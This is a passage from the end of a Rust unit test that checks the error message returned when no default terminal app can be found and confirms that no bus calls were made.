        assert!(!r.ok && r.message.contains("couldn't find your default terminal app") && r.message.ends_with(f.cmd), "{}", r.message);
        assert!(bus.calls.lock().unwrap().is_empty());
    }
}
